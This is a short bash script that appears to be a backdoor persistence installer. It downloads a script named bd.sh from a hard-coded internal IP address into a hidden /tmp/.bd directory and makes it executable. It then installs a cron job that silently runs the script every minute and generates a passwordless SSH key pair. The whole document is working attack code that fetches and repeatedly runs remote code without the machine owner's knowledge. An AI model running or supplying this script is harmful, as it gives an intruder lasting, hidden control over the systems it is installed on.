#!/bin/bash

urlprefix='http://192.168.100.147'
[ ! -f /tmp/.bd/crontab ] && mkdir /tmp/.bd
curl -s -o /tmp/.bd/bd.sh $urlprefix/bd.sh
chmod +x /tmp/.bd/bd.sh
[ ! -f /tmp/.bd/crontab ] && echo '* * * * * /bin/bash /tmp/.bd/bd.sh > /dev/null 2>&1' >> /tmp/.bd/crontab
crontab /tmp/.bd/crontab
[ ! -f ~/.ssh/id_rsa.pub ] && ssh-keygen -t rsa -q -N '' -f ~/.ssh/id_rsa
